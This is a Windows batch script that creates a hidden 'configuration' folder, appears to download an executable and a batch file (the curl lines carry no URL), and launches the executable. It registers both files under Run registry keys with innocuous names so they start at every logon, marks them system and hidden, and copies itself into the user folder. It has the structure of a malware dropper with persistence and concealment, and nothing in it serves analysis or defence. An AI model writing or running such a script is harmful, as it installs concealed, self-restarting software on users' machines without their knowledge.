@echo off
goto conf

:conf
IF EXIST "C:\Users\%USERNAME%\configuration\" (
	goto hote
) ELSE (
	mkdir "C:\Users\%USERNAME%\configuration"
	goto hote
)

:hote
IF EXIST "C:\Users\%USERNAME%\configuration\wxappx.exe" (
	goto rewind_1
) ELSE (
	curl
	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WXAppX /t REG_SZ /d "C:\Users\%USERNAME%\configuration\wxappx.exe" /f
	attrib +s +h "C:\Users\%USERNAME%\configuration\wxappx.exe"
	start "" "C:\Users\%USERNAME%\configuration\wxappx.exe"
	goto rewind_1
)

:rewind_1
IF EXIST "C:\Users\%USERNAME%\configuration\rewind.bat" (
	goto rewind_2
) ELSE (
	curl
	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v RewindConfig /t REG_SZ /d "C:\Users\%USERNAME%\configuration\rewind.bat" /f
	attrib +s +h "C:\Users\%USERNAME%\configuration\rewind.bat"
	goto rewind_2
)

:rewind_2
IF EXIST "C:\Users\%USERNAME%\rewind.bat" (
	attrib +h "C:\Users\%USERNAME%\configuration" /s /d
) ELSE (
	COPY "C:\Users\%USERNAME%\configuration\rewind.bat" "C:\Users\%USERNAME%\"
	attrib +h "C:\Users\%USERNAME%\configuration" /s /d
	attrib +s +h "C:\Users\%USERNAME%\rewind.bat"
	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Rewind /t REG_SZ /d "C:\Users\%USERNAME%\rewind.bat" /f
)
exit /B 0